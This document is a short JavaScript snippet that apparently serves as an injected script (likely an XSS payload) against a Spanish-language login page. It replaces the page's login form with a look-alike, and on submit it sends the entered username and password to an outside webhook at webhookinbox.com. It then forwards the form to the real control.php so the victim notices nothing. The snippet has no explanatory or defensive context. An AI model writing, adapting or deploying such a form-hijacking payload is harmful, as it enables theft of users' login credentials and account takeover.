document.getElementsByTagName("form")[0].remove();
    var newForm = document.createElement('form');

    const formBody = 
        `<label for="usuario">USUARIO: </label>
        <input id="usuario" class="user" type="text" name="usuario" value="" size="20" maxlength="50"><br>
        <label for="password">CONTRASEÑA: </label>
        <input id="password" class="password" type="password" name="password" size="20" maxlength="50"><br>
        <button type="submit" class="enviar_btn">Entrar</button>`;

    newForm.setAttribute('method', 'post');
    newForm.setAttribute('action', 'javascript:a()');
    newForm.innerHTML = formBody;

    var divContenido = document.getElementById('contenido');
    var h1Div = divContenido.getElementsByTagName('h1')[0];
    h1Div.after(newForm);


    function a(){
        
        var xhr = new XMLHttpRequest();
        

        var url = "https://api.webhookinbox.com/i/fro4Jlis/in/";
        
        xhr.open('POST', url, true);
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');  
        const data = {
                usuario: document.getElementById("usuario").value,
                password: document.getElementById("password").value
            };

        xhr.onload = function(){
                newForm.setAttribute('action', 'control.php');
                newForm.submit();
            
        };
        xhr.send(JSON.stringify(data));
    }
